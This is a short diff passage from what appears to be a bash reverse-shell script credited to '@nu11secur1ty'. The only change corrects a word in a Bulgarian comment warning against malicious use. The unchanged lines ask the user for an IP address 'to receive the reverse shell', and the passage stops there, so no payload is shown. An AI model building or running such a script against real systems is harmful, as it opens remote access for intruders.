@@ -1,7 +1,7 @@
 #!/usr/bin/bash
 # Author @nu11secur1ty
 # Do not use this for malicious purpose
-# Ne izpolzvai za zlonamereni celi TUPALKO
+# Ne izpolzvai za zlonamereni celi TUPAKO
 
 echo "Type your IP to receive the reverse shell"
 	read SRV
